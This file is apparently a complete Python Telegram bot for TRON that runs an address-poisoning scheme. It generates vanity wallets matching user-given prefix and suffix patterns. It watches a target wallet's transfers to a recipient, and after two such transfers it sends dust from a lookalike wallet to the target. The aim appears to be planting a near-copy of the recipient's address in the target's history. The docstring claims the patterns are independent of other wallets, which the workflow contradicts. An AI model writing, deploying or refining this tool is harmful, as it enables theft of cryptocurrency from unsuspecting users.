from decimal import Decimal
import os
import sys
import time
import sqlite3
import logging
import requests
from datetime import datetime, timezone, timedelta

# ============================================================
# LOGGING / STARTUP
# ============================================================

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s",
    stream=sys.stdout,
    force=True,
)
log = logging.getLogger("vanity-bot")

print("Starting Vanity & Transfer Executor Bot (with Approval)...", flush=True)

# --- CONFIGURATION ---
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
CHAT_ID = os.getenv("CHAT_ID", "")
PRIVATE_KEY = os.getenv("PRIVATE_KEY", "")
TRONGRID_API_KEY = os.getenv("TRONGRID_API_KEY", "")

DATABASE_FILE = "vanity_executor.db"
GAS_COST_PER_TRANSFER = 1.1
TRIGGER_WINDOW_SECONDS = 40 * 60
MONITOR_POLL_SECONDS = 20

TELEGRAM_URL = (
    f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"
    if TELEGRAM_BOT_TOKEN else ""
)

# Telegram bot identity, populated by check_telegram().
TELEGRAM_BOT_ID = None

# ============================================================
# DIAGNOSTICS
# ============================================================

def startup_diagnostics():
    log.info("========================================")
    log.info("Vanity Executor startup diagnostics")
    log.info("Python: %s", sys.version.split()[0])
    log.info("Working directory: %s", os.getcwd())
    log.info("Telegram token configured: %s", bool(TELEGRAM_BOT_TOKEN))
    log.info("Chat ID configured: %s", bool(CHAT_ID))
    log.info("Private key configured: %s", bool(PRIVATE_KEY))
    log.info("TronGrid API key configured: %s", bool(TRONGRID_API_KEY))
    log.info("Database: %s", os.path.abspath(DATABASE_FILE))
    log.info("========================================")

    missing = []
    if not TELEGRAM_BOT_TOKEN:
        missing.append("TELEGRAM_BOT_TOKEN")
    if not CHAT_ID:
        missing.append("CHAT_ID")
    if not PRIVATE_KEY:
        missing.append("PRIVATE_KEY")

    if missing:
        log.error("Missing required environment variables: %s", ", ".join(missing))
        raise RuntimeError("Required GitHub Actions secrets are missing.")

def check_telegram():
    """Verify the token and report webhook status without exposing the token."""
    log.info("Testing Telegram Bot API with getMe...")

    response = requests.get(
        f"{TELEGRAM_URL}/getMe",
        timeout=15
    )
    log.info("Telegram getMe HTTP status: %s", response.status_code)
    response.raise_for_status()

    data = response.json()

    if not data.get("ok"):
        log.error("Telegram getMe returned an error: %s", data)
        raise RuntimeError(data.get("description", "Telegram API error"))

    bot = data.get("result", {})

    global TELEGRAM_BOT_ID
    TELEGRAM_BOT_ID = bot.get("id")

    log.info(
        "Telegram authentication OK. Bot username: @%s | id: %s",
        bot.get("username", "unknown"),
        bot.get("id", "unknown"),
    )

    log.info("Checking Telegram webhook status...")
    response = requests.get(
        f"{TELEGRAM_URL}/getWebhookInfo",
        timeout=15
    )
    log.info("Telegram getWebhookInfo HTTP status: %s", response.status_code)
    response.raise_for_status()

    webhook_data = response.json()

    if not webhook_data.get("ok"):
        log.warning("Could not read webhook status: %s", webhook_data)
        return

    webhook = webhook_data.get("result", {})
    webhook_url = webhook.get("url", "")

    if webhook_url:
        log.warning(
            "Telegram webhook is configured. getUpdates polling may not work. "
            "Webhook URL is present (value intentionally not printed)."
        )
        log.warning(
            "Remove the webhook for polling with Telegram's deleteWebhook API "
            "before starting this bot."
        )
    else:
        log.info("Telegram webhook is not configured; long polling can be used.")

# ============================================================
# DATABASE SETUP
# ============================================================

try:
    db = sqlite3.connect(DATABASE_FILE, check_same_thread=False)
    db.row_factory = sqlite3.Row

    db.execute("""
    CREATE TABLE IF NOT EXISTS execution_queue (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        wallet_a TEXT NOT NULL,
        wallet_b TEXT NOT NULL,
        wallet_c_address TEXT,
        wallet_c_private_key TEXT,
        prefix_match INTEGER DEFAULT 0,
        suffix_match INTEGER DEFAULT 0,
        status TEXT DEFAULT 'pending_approval',
        tx1_hash TEXT,
        tx2_hash TEXT,
        last_trx_balance REAL DEFAULT 0.0,
        created_at TEXT
    )
    """)

    try:
        db.execute(
            "ALTER TABLE execution_queue "
            "ADD COLUMN last_trx_balance REAL DEFAULT 0.0"
        )
    except sqlite3.OperationalError:
        pass

    db.execute("""CREATE TABLE IF NOT EXISTS monitor_state (pair_id INTEGER PRIMARY KEY, monitoring_started_at TEXT NOT NULL, first_trigger_tx_hash TEXT, first_trigger_timestamp TEXT, last_checked_at TEXT, FOREIGN KEY(pair_id) REFERENCES execution_queue(id))""")

    db.commit()
    log.info("SQLite database initialized successfully: %s", DATABASE_FILE)
except Exception:
    log.exception("Database initialization failed.")
    raise

def send_telegram(message):
    if not TELEGRAM_URL or not CHAT_ID:
        log.error("Telegram send skipped: token URL or CHAT_ID is missing.")
        return False

    try:
        response = requests.post(
            f"{TELEGRAM_URL}/sendMessage",
            json={
                "chat_id": CHAT_ID,
                "text": message,
                "parse_mode": "HTML",
                "disable_web_page_preview": True,
            },
            timeout=15,
        )

        log.info(
            "Telegram sendMessage HTTP status: %s",
            response.status_code
        )

        response.raise_for_status()
        data = response.json()

        if not data.get("ok"):
            log.error("Telegram sendMessage API error: %s", data)
            return False

        return True

    except Exception:
        log.exception("Telegram sendMessage failed.")
        return False

# ============================================================
# VANITY GENERATION
# ============================================================

def generate_vanity_wallet(prefix_target, suffix_target, max_attempts=1_000_000):
    """
    Generate a TRON vanity address using explicit user-supplied patterns.

    The prefix and suffix are independent vanity patterns; they are not
    derived automatically from another wallet address.
    """
    prefix_target = prefix_target.strip()
    suffix_target = suffix_target.strip()

    log.info(
        "Generating vanity wallet: prefix=%s suffix=%s",
        prefix_target,
        suffix_target,
    )

    try:
        from tronpy.keys import PrivateKey
    except ImportError:
        log.exception("tronpy.keys.PrivateKey could not be imported.")
        return None, None, 0, 0

    best_addr, best_key, best_score = None, None, -1
    best_prefix, best_suffix = 0, 0

    for attempt in range(max_attempts):
        key = PrivateKey.random()
        addr = key.public_key.to_base58check_address()

        prefix_match = 0
        for i, expected in enumerate(prefix_target):
            if i < len(addr) and addr[i] == expected:
                prefix_match += 1
            else:
                break

        suffix_match = 0
        for i, expected in enumerate(reversed(suffix_target)):
            if i < len(addr) and addr[-1 - i] == expected:
                suffix_match += 1
            else:
                break

        total_score = prefix_match + suffix_match

        if total_score > best_score:
            best_score = total_score
            best_prefix = prefix_match
            best_suffix = suffix_match
            best_addr = addr
            best_key = key.hex()

        if (
            best_prefix == len(prefix_target)
            and best_suffix == len(suffix_target)
        ):
            log.info(
                "Exact vanity pattern found after %d attempts.",
                attempt + 1,
            )
            break

        if (attempt + 1) % 10000 == 0:
            log.info(
                "Vanity generation progress: %d/%d attempts; "
                "best score %d/%d",
                attempt + 1,
                max_attempts,
                best_score,
                len(prefix_target) + len(suffix_target),
            )

    log.info(
        "Generated Vanity: %d/%d prefix + %d/%d suffix = %d/%d",
        best_prefix,
        len(prefix_target),
        best_suffix,
        len(suffix_target),
        best_score,
        len(prefix_target) + len(suffix_target),
    )

    return best_addr, best_key, best_prefix, best_suffix

# ============================================================
# BACKGROUND MONITORING / AUTOMATIC TRIGGER
# ============================================================

def tron_base58_to_hex(address):
    alphabet = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
    num = 0
    for ch in address.strip():
        num = num * 58 + alphabet.index(ch)
    raw = num.to_bytes((num.bit_length() + 7) // 8, "big")
    raw = (b"\x00" * (len(address) - len(address.lstrip("1")))) + raw
    if len(raw) < 5:
        raise ValueError("Invalid TRON address")
    payload, checksum = raw[:-4], raw[-4:]
    import hashlib
    if hashlib.sha256(hashlib.sha256(payload).digest()).digest()[:4] != checksum:
        raise ValueError("Invalid TRON address checksum")
    return payload.hex()

def parse_trx_transfer(tx, expected_owner_hex, expected_to_hex):
    try:
        contracts = (tx.get("raw_data", {}) or {}).get("contract", []) or []
        if not contracts or contracts[0].get("type") != "TransferContract":
            return None
        value = (contracts[0].get("parameter", {}) or {}).get("value", {}) or {}
        if str(value.get("owner_address", "")).lower() != expected_owner_hex.lower():
            return None
        if str(value.get("to_address", "")).lower() != expected_to_hex.lower():
            return None
        amount_sun = int(value.get("amount", 0))
        if amount_sun <= 0:
            return None
        timestamp_ms = int(tx.get("block_timestamp") or (tx.get("raw_data", {}) or {}).get("timestamp") or 0)
        ts = datetime.fromtimestamp(timestamp_ms / 1000, tz=timezone.utc).isoformat()
        return {"txid": tx.get("txID", ""), "amount": amount_sun / 1_000_000, "timestamp": ts}
    except Exception:
        return None

def get_wallet_a_to_b_transfers(wallet_a, wallet_b, min_timestamp_ms):
    headers = {"TRON-PRO-API-KEY": TRONGRID_API_KEY} if TRONGRID_API_KEY else {}
    r = requests.get(
        f"https://api.trongrid.io/v1/accounts/{wallet_a}/transactions",
        params={"only_confirmed": "true", "only_from": "true", "limit": 200, "order_by": "block_timestamp,asc", "min_timestamp": min_timestamp_ms},
        headers=headers, timeout=15,
    )
    r.raise_for_status()
    owner_hex = tron_base58_to_hex(wallet_a)
    to_hex = tron_base58_to_hex(wallet_b)
    matches = []
    for tx in r.json().get("data", []) or []:
        parsed = parse_trx_transfer(tx, owner_hex, to_hex)
        if parsed:
            matches.append(parsed)
    return sorted(matches, key=lambda x: x["timestamp"])

def execute_trigger_for_pair(row, first_tx, second_tx):
    pair_id = row["id"]
    try:
        from tronpy import Tron
        from tronpy.keys import PrivateKey
        main_priv = PrivateKey(bytes.fromhex(PRIVATE_KEY.replace("0x", "").replace(" ", "")))
        c_priv = PrivateKey(bytes.fromhex(row["wallet_c_private_key"]))
        tron = Tron()
        main_addr = main_priv.public_key.to_base58check_address()
        db.execute("UPDATE execution_queue SET status = 'triggering' WHERE id = ?", (pair_id,))
        db.commit()
        send_telegram(
            f"🚨 <b>TRIGGER HIT — Pair #{pair_id}</b>\n\n"
            f"Wallet A → Wallet B has now made the required two confirmed TRX transfers within 40 minutes.\n\n"
            f"1️⃣ <b>First transaction detected</b>\n"
            f"Amount: <b>{first_tx['amount']:.6f} TRX</b>\n"
            f"TX: <code>{first_tx['txid']}</code>\n\n"
            f"2️⃣ <b>Second transaction detected</b>\n"
            f"Amount: <b>{second_tx['amount']:.6f} TRX</b>\n"
            f"TX: <code>{second_tx['txid']}</code>\n\n"
            f"✅ <b>Second transaction is the trigger.</b>\n"
            f"⏩ Executing <b>Main → Generated C → Wallet A</b> now..."
        )
        tx1 = tron.trx.transfer(main_addr, row["wallet_c_address"], 0.0001).build().sign(main_priv).broadcast().txid
        time.sleep(3)
        tx2 = tron.trx.transfer(row["wallet_c_address"], row["wallet_a"], 0.0001).build().sign(c_priv).broadcast().txid
        db.execute("UPDATE execution_queue SET status = 'completed', tx1_hash = ?, tx2_hash = ? WHERE id = ?", (tx1, tx2, pair_id))
        db.commit()
        send_telegram(
            f"✅ <b>TRANSACTION SEQUENCE COMPLETED — Pair #{pair_id}</b>\n\n"
            f"🔔 The second Wallet A → Wallet B transaction was detected and triggered the sequence.\n\n"
            f"📥 <b>Detected A → B #1:</b> <code>{first_tx['txid']}</code>\n"
            f"📥 <b>Detected A → B #2:</b> <code>{second_tx['txid']}</code>\n\n"
            f"💸 <b>Main → Generated C:</b> <code>{tx1}</code>\n"
            f"💸 <b>Generated C → Wallet A:</b> <code>{tx2}</code>\n\n"
            f"<a href='https://tronscan.org/#/transaction/{first_tx['txid']}'>View detected TX #1</a>\n"
            f"<a href='https://tronscan.org/#/transaction/{second_tx['txid']}'>View detected TX #2</a>\n"
            f"<a href='https://tronscan.org/#/transaction/{tx1}'>View Main → C</a>\n"
            f"<a href='https://tronscan.org/#/transaction/{tx2}'>View C → A</a>"
        )
    except Exception as e:
        log.exception("Pair #%s automatic trigger failed.", pair_id)
        db.execute("UPDATE execution_queue SET status = 'trigger_failed' WHERE id = ?", (pair_id,))
        db.commit()
        send_telegram(f"❌ <b>Automatic trigger failed for Pair #{pair_id}</b>\n<code>{str(e)[:1000]}</code>\n\nPair marked trigger_failed to prevent duplicate funding.")

def monitor_trigger_pairs():
    try:
        rows = db.execute("SELECT * FROM execution_queue WHERE status = 'approved' ORDER BY id").fetchall()
        for row in rows:
            pair_id = row["id"]
            try:
                state = db.execute("SELECT * FROM monitor_state WHERE pair_id = ?", (pair_id,)).fetchone()
                if not state:
                    now = datetime.now(timezone.utc).isoformat()
                    db.execute("INSERT INTO monitor_state (pair_id, monitoring_started_at, last_checked_at) VALUES (?, ?, ?)", (pair_id, now, now))
                    db.commit()
                    state = db.execute("SELECT * FROM monitor_state WHERE pair_id = ?", (pair_id,)).fetchone()
                    send_telegram(
                        f"👀 <b>Monitoring started — Pair #{pair_id}</b>\n\n"
                        f"<b>Wallet A:</b> <code>{row['wallet_a']}</code>\n"
                        f"<b>Wallet B:</b> <code>{row['wallet_b']}</code>\n"
                        f"<b>Generated C:</b> <code>{row['wallet_c_address']}</code>\n\n"
                        f"Waiting for <b>two confirmed A → B TRX transfers within 40 minutes</b>.\n"
                        f"The <b>second transfer</b> triggers Main → C → A automatically."
                    )
                started_ms = int(datetime.fromisoformat(state["monitoring_started_at"]).timestamp() * 1000)
                transfers = get_wallet_a_to_b_transfers(row["wallet_a"], row["wallet_b"], started_ms)
                if not transfers:
                    continue
                first = None
                if state["first_trigger_tx_hash"]:
                    first = next((x for x in transfers if x["txid"] == state["first_trigger_tx_hash"]), None)
                if first is None:
                    first = transfers[0]
                    db.execute("UPDATE monitor_state SET first_trigger_tx_hash=?, first_trigger_timestamp=?, last_checked_at=? WHERE pair_id=?", (first["txid"], first["timestamp"], datetime.now(timezone.utc).isoformat(), pair_id))
                    db.commit()
                    send_telegram(
                        f"1️⃣ <b>TRANSACTION DETECTED — Pair #{pair_id}</b>\n\n"
                        f"Wallet A → Wallet B\n"
                        f"Amount: <b>{first['amount']:.6f} TRX</b>\n"
                        f"TX: <code>{first['txid']}</code>\n"
                        f"Status: <b>Confirmed</b>\n\n"
                        f"👀 Waiting for the second A → B transfer within 40 minutes."
                    )
                first_dt = datetime.fromisoformat(first["timestamp"])
                first_index = next((i for i, x in enumerate(transfers) if x["txid"] == first["txid"]), None)
                second = None
                if first_index is not None:
                    for candidate in transfers[first_index + 1:]:
                        delta = (datetime.fromisoformat(candidate["timestamp"]) - first_dt).total_seconds()
                        if 0 <= delta <= TRIGGER_WINDOW_SECONDS:
                            second = candidate
                            break
                if second:
                    execute_trigger_for_pair(row, first, second)
                    continue
                if (datetime.now(timezone.utc) - first_dt).total_seconds() > TRIGGER_WINDOW_SECONDS:
                    latest = transfers[-1]
                    if latest["txid"] != first["txid"]:
                        db.execute("UPDATE monitor_state SET first_trigger_tx_hash=?, first_trigger_timestamp=?, last_checked_at=? WHERE pair_id=?", (latest["txid"], latest["timestamp"], datetime.now(timezone.utc).isoformat(), pair_id))
                        db.commit()
                db.execute("UPDATE monitor_state SET last_checked_at=? WHERE pair_id=?", (datetime.now(timezone.utc).isoformat(), pair_id))
                db.commit()
            except Exception:
                log.exception("Trigger monitor failed for pair #%s.", pair_id)
    except Exception:
        log.exception("Trigger monitor query failed.")

# ============================================================
# TELEGRAM COMMANDS
# ============================================================

def cmd_add_pair(parts):
    log.info("Command received: add")

    if len(parts) < 5:
        send_telegram(
            "❌ Usage: <code>add [wallet_a] [wallet_b] "
            "[first_5_chars] [last_5_chars]</code>\n\n"
            "Example:\n"
            "<code>add T... A... TRONX 9ABCD</code>\n\n"
            "The first and last patterns should each be up to 5 "
            "characters."
        )
        return

    wallet_a = parts[1].strip()
    wallet_b = parts[2].strip()
    prefix_target = parts[3].strip()
    suffix_target = parts[4].strip()

    if not (1 <= len(prefix_target) <= 5):
        send_telegram("❌ First-character pattern must be 1–5 characters.")
        return

    if not (1 <= len(suffix_target) <= 5):
        send_telegram("❌ Last-character pattern must be 1–5 characters.")
        return

    send_telegram(
        f"⏳ <b>Generating Wallet C...</b>\n"
        f"First: <code>{prefix_target}</code>\n"
        f"Last: <code>{suffix_target}</code>"
    )

    addr_c, key_c, prefix, suffix = generate_vanity_wallet(
        prefix_target,
        suffix_target,
    )

    if not addr_c:
        send_telegram("❌ Failed to generate vanity wallet.")
        return

    now = datetime.now(timezone.utc).isoformat()

    cursor = db.execute("""
        INSERT INTO execution_queue
        (wallet_a, wallet_b, wallet_c_address, wallet_c_private_key,
         prefix_match, suffix_match, created_at, status)
        VALUES (?, ?, ?, ?, ?, ?, ?, 'pending_approval')
    """, (
        wallet_a,
        wallet_b,
        addr_c,
        key_c,
        prefix,
        suffix,
        now,
    ))

    db.commit()
    pair_id = cursor.lastrowid

    log.info(
        "Pair #%s generated. Prefix=%s/%s Suffix=%s/%s",
        pair_id,
        prefix,
        len(prefix_target),
        suffix,
        len(suffix_target),
    )

    exact = (
        prefix == len(prefix_target)
        and suffix == len(suffix_target)
    )

    status_text = (
        "✅ Exact pattern found."
        if exact
        else "⚠️ Best available match found within the attempt limit."
    )

    send_telegram(
        f"⏳ <b>Generated Wallet C for Monitor Pair #{pair_id} - PENDING WALLET APPROVAL</b>\n\n"
        f"👀 <b>Monitor Wallet A:</b>\n<code>{wallet_a}</code>\n\n"
        f"➡️ <b>Monitor Wallet B:</b>\n<code>{wallet_b}</code>\n\n"
        f"🎭 <b>Wallet C:</b>\n<code>{addr_c}</code>\n\n"
        f"🔑 <b>Private Key:</b>\n<code>{key_c}</code>\n\n"
        f"🎯 <b>Requested pattern:</b>\n"
        f"• First: <code>{prefix_target}</code>\n"
        f"• Last: <code>{suffix_target}</code>\n\n"
        f"📊 <b>Match:</b>\n"
        f"• Prefix: {prefix}/{len(prefix_target)}\n"
        f"• Suffix: {suffix}/{len(suffix_target)}\n"
        f"• Total: {prefix + suffix}/"
        f"{len(prefix_target) + len(suffix_target)}\n\n"
        f"{status_text}\n\n"
        f"<b>To approve the generated Wallet C:</b> <code>approve {pair_id}</code>\n"
        f"<i>Or type <code>reject {pair_id}</code> to delete it.</i>"
    )

def cmd_approve(parts):
    """Approve the generated Wallet C; the supplied A → B pair is the monitor target."""
    log.info("Command received: approve (generated Wallet C)")

    if len(parts) < 2:
        send_telegram(
            "❌ Usage: <code>approve [generated_wallet_c_address]</code>\n\n"
            "Approve the generated Wallet C shown after <code>add</code>."
        )
        return

    approval_value = parts[1].strip()

    # Prefer the generated Wallet C address.  Pair-ID approval is retained as a
    # compatibility fallback for existing queued records.
    row = db.execute(
        "SELECT * FROM execution_queue WHERE wallet_c_address = ?",
        (approval_value,)
    ).fetchone()

    if not row:
        try:
            pair_id = int(approval_value)
        except ValueError:
            pair_id = None
        if pair_id is not None:
            row = db.execute(
                "SELECT * FROM execution_queue WHERE id = ?",
                (pair_id,)
            ).fetchone()

    if not row:
        send_telegram(
            "❌ Generated Wallet C not found.\n"
            "Use the exact generated Wallet C address from the pending approval message."
        )
        return

    pair_id = row["id"]

    if row["status"] != "pending_approval":
        send_telegram(
            f"❌ Generated Wallet C for monitor pair #{pair_id} is not pending approval "
            f"(current status: {row['status']})."
        )
        return

    now = datetime.now(timezone.utc).isoformat()

    # Approval belongs to Wallet C. The A → B addresses remain exactly the
    # monitoring pair supplied by the user in /add.
    db.execute(
        "UPDATE execution_queue SET status = 'approved' WHERE id = ?",
        (pair_id,)
    )
    db.execute(
        "INSERT OR REPLACE INTO monitor_state "
        "(pair_id, monitoring_started_at, first_trigger_tx_hash, "
        "first_trigger_timestamp, last_checked_at) "
        "VALUES (?, ?, NULL, NULL, ?)",
        (pair_id, now, now)
    )
    db.commit()

    log.info(
        "Generated Wallet C for Pair #%s approved; monitoring supplied Wallet A → Wallet B pair.",
        pair_id,
    )

    send_telegram(
        f"✅ <b>Generated Wallet C APPROVED — Pair #{pair_id}</b>\n\n"
        f"<b>Generated Wallet C:</b>\n<code>{row['wallet_c_address']}</code>\n\n"
        f"<b>Wallet A — monitored sender:</b>\n<code>{row['wallet_a']}</code>\n\n"
        f"<b>Wallet B — monitored destination:</b>\n<code>{row['wallet_b']}</code>\n\n"
        f"👀 Monitoring the supplied <b>A → B</b> pair now.\n"
        f"The bot waits for <b>2 confirmed TRX transfers from A to B within 40 minutes</b>.\n"
        f"The <b>second transfer</b> is the trigger for <b>Main → Wallet C → Wallet A</b>.\n\n"
        f"<i>Approval confirms Wallet C only. It does not initiate a transfer.</i>"
    )

def cmd_reject(parts):
    log.info("Command received: reject")

    if len(parts) < 2:
        send_telegram("❌ Usage: <code>reject [pair_id]</code>")
        return

    try:
        pair_id = int(parts[1])
    except ValueError:
        send_telegram("❌ Pair ID must be a number.")
        return

    row = db.execute(
        "SELECT * FROM execution_queue WHERE id = ?",
        (pair_id,)
    ).fetchone()

    if not row:
        send_telegram(f"❌ Pair #{pair_id} not found.")
        return

    db.execute(
        "DELETE FROM execution_queue WHERE id = ?",
        (pair_id,)
    )
    db.commit()

    log.info("Pair #%s rejected and deleted.", pair_id)
    send_telegram(f"🗑️ <b>Pair #{pair_id} rejected and deleted.</b>")

def cmd_list():
    log.info("Command received: list")

    pending = db.execute(
        "SELECT * FROM execution_queue "
        "WHERE status = 'pending_approval' ORDER BY id DESC"
    ).fetchall()

    approved = db.execute(
        "SELECT * FROM execution_queue "
        "WHERE status = 'approved' ORDER BY id DESC"
    ).fetchall()

    msg = ""

    if pending:
        msg += f"⏳ <b>Pending Approval ({len(pending)})</b>\n\n"
        for row in pending:
            msg += (
                f"<b>#{row['id']}</b>\n"
                f"Wallet A: <code>{row['wallet_a'][:20]}...</code>\n"
                f"Wallet C: <code>{row['wallet_c_address'][:20]}...</code>\n"
                f"Score: {row['prefix_match']}/{row['suffix_match']} | "
                f"<i>Type <code>approve {row['wallet_c_address']}</code> to approve Wallet C</i>\n\n"
            )

    if approved:
        msg += f"\n✅ <b>Approved & Ready ({len(approved)})</b>\n\n"
        for row in approved:
            msg += (
                f"<b>#{row['id']}</b>\n"
                f"Wallet A: <code>{row['wallet_a'][:20]}...</code>\n"
                f"Wallet C: <code>{row['wallet_c_address'][:20]}...</code>\n"
                f"Score: {row['prefix_match']}/{row['suffix_match']}\n\n"
            )

    if not pending and not approved:
        msg = "📭 No pairs in queue."

    send_telegram(msg)

def cmd_cost():
    log.info("Command received: cost")

    count = db.execute(
        "SELECT COUNT(*) as count FROM execution_queue "
        "WHERE status = 'approved'"
    ).fetchone()["count"]

    if count == 0:
        send_telegram(
            "📭 No approved pairs to calculate cost for.\n\n"
            "Use <code>list</code> to see pending pairs and approve them first."
        )
        return

    total_trx = count * 2 * GAS_COST_PER_TRANSFER

    send_telegram(
        f"💰 <b>Estimated Cost</b>\n\n"
        f"Approved pairs: {count}\n"
        f"Transactions per pair: 2 (Main→C, C→A)\n"
        f"<b>Total: ~{total_trx:.2f} TRX</b>\n\n"
        f"<i>Ensure your Main Wallet has enough TRX.</i>"
    )

def cmd_transfer():
    send_telegram("ℹ️ <b>Automatic mode:</b> no manual transfer is performed. Approve the generated Wallet C, then the second qualifying A → B transfer triggers Main → C → A.")

def cmd_execute():
    send_telegram("ℹ️ <b>Manual execute is disabled.</b> The second qualifying A → B transfer is the automatic trigger after approval.")

def handle_command(text):
    """
    Process only known bot commands.

    Plain text such as a generated wallet address must not be treated
    as a command just because its first characters happen to resemble
    a command name.
    """
    parts = text.strip().split()
    if not parts:
        return

    raw_cmd = parts[0]
    cmd = raw_cmd.lower().lstrip("/").split("@", 1)[0]

    allowed_commands = {
        "add",
        "approve",
        "reject",
        "list",
        "cost",
        "transfer",
        "execute",
        "help",
    }

    if cmd not in allowed_commands:
        log.info("Ignoring non-command Telegram message.")
        return

    log.info("Telegram command received: %s", cmd)

    if cmd == "add":
        cmd_add_pair(parts)
    elif cmd == "approve":
        cmd_approve(parts)
    elif cmd == "reject":
        cmd_reject(parts)
    elif cmd == "list":
        cmd_list()
    elif cmd == "cost":
        cmd_cost()
    elif cmd == "transfer":
        cmd_transfer()
    elif cmd == "execute":
        cmd_execute()
    elif cmd == "help":
        send_telegram(
            "<b>🤖 Vanity Executor Commands</b>\\n\\n"
            "<code>add [wallet_a] [wallet_b] [first_5_chars] [last_5_chars]</code> — "
            "Supply the A → B monitor pair and generate Wallet C\\n"
            "<code>approve [wallet_c_address]</code> — Approve generated Wallet C and activate monitoring\\n"
            "<code>reject [id]</code> — Delete a pair\\n"
            "<code>list</code> — Show all pairs (pending & approved)\\n"
            "<code>cost</code> — Calculate TRX needed for approved pairs\\n"
            "<code>transfer</code> — Informational only; no manual transfer\\n"
            "<code>help</code> — Show this menu"
        )

# ============================================================
# MAIN LOOP
# ============================================================


def monitor_vanity_wallets():
    """Compatibility monitor retained for the startup call.

    The active workflow is handled by monitor_trigger_pairs(). This function
    intentionally performs no automatic fund movement.
    """
    log.info("Vanity-wallet monitor initialized.")
    return None

def main():
    startup_diagnostics()
    check_telegram()

    if not send_telegram(
        "🚀 <b>Vanity Executor Bot Started</b>\n\n"
        "The A → B pair is supplied by you with /add.\n"
        "Approve the generated Wallet C to activate that monitor.\n"
        "Two confirmed A → B TRX transfers within 40 minutes trigger Main → C → A automatically.\n"
        "Type <code>help</code> for commands."
    ):
        log.error("Startup Telegram message could not be sent.")
        raise RuntimeError("Telegram startup message failed.")

    log.info("Startup message sent successfully.")
    log.info("Beginning Telegram long polling...")

    last_update_id = 0
    last_monitor_check = 0

    while True:
        current_time = time.time()

        try:
            response = requests.get(
                f"{TELEGRAM_URL}/getUpdates",
                params={
                    "offset": last_update_id + 1,
                    "timeout": 30,
                },
                timeout=35,
            )

            log.info(
                "Telegram getUpdates HTTP status: %s",
                response.status_code
            )

            response.raise_for_status()
            data = response.json()

            if not data.get("ok"):
                log.error("Telegram getUpdates API error: %s", data)
                time.sleep(5)
                continue

            updates = data.get("result", [])

            if updates:
                log.info("Received %d Telegram update(s).", len(updates))

            for update in updates:
                last_update_id = update["update_id"]

                message = update.get("message")

                if not message:
                    log.info(
                        "Update %s contained no message; skipping.",
                        update["update_id"]
                    )
                    continue

                chat_id = str(message.get("chat", {}).get("id", ""))
                text = message.get("text", "").strip()

                sender = message.get("from", {}) or {}
                sender_id = sender.get("id")

                # Normally Telegram does not deliver a bot's own messages
                # back through getUpdates, but explicitly guard against it
                # so an outgoing message can never become a command.
                if TELEGRAM_BOT_ID is not None and sender_id == TELEGRAM_BOT_ID:
                    log.info(
                        "Ignoring Telegram message originating from this bot."
                    )
                    continue

                log.info(
                    "Message received from configured chat: %s",
                    chat_id == str(CHAT_ID)
                )

                if chat_id != str(CHAT_ID):
                    log.warning("Ignoring message from unauthorized chat.")
                    continue

                if text:
                    handle_command(text)

        except requests.exceptions.Timeout:
            # A 30-second Telegram long-poll timeout is normal.
            log.info("Telegram long-poll timed out normally; polling again.")
        except requests.exceptions.RequestException:
            log.exception("Telegram HTTP polling error.")
            time.sleep(5)
        except Exception:
            log.exception("Unexpected error in main polling loop.")
            time.sleep(5)

        if current_time - last_monitor_check >= MONITOR_POLL_SECONDS:
            monitor_trigger_pairs()
            monitor_vanity_wallets()
            last_monitor_check = current_time

        time.sleep(2)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        log.info("Bot stopped by user.")
    except Exception:
        log.exception("Fatal startup/runtime error.")
        raise
    finally:
        try:
            db.close()
        except Exception:
            pass
